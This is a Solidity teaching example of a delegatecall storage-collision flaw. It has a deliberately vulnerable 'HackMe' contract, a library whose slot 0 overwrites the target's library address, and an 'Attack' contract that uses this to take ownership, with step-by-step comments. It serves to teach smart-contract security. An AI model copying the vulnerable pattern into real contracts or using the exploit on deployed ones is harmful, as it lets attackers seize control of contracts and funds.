// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/// 2. storage layout must be the same for A and B (In the exact same order, for the slot to match)

contract HackMe {
  address public lib; // slot 0
  address public owner; // slot 1
  uint256 public someNumber; // slot 2

  constructor(address _lib) {
    lib = _lib;
    owner = msg.sender;
  }

  function doSomething(uint256 _num) public {
    /// Here we delegatecall lib with the context and the storage layout of HackMe
    (bool success, ) = lib.delegatecall(
      abi.encodeWithSignature("doSomething(uint256)", _num)
    );
    require(success);
  }
}

contract Lib {
  uint256 public someNumber; // slot 0

  function doSomething(uint256 _num) public {
    /// And here we set the variable at slot 0 to _num; but because the current context is "HackMe" the variable at slot 0 isn't "someNumber" but it's "lib", so here we actually set `lib = _num;`
    someNumber = _num;
  }
}

contract Attack {
  address public lib; // slot 0
  address public owner; // slot 1
  uint256 public someNumber; // slot 2

  HackMe public hackMe; // slot 3

  constructor(HackMe _hackMe) {
    hackMe = HackMe(_hackMe);
  }

  function attack() public {
    hackMe.doSomething(uint256(uint160(address(this)))); // Change "lib" in HackMe to the address of this contract
    hackMe.doSomething(1); // Here "lib" in HackMe = address(this), so hackMe will delegatecall to this contract and call "doSomething"
  }

  function doSomething(uint256 _num) public {
    /// Attack (attack) -> HackMe --- delegatecall ---> Attack (doSomething)
    /// msg.sender = Attack                               msg.sender = Attack
    owner = msg.sender; // Here we update slot 1 to Attack address, but because this func is called by HackMe w/ delegatecall we update HackMe slot 1 to Attack address and HackMe at slot 1 is also the HackMe owner
  }
}
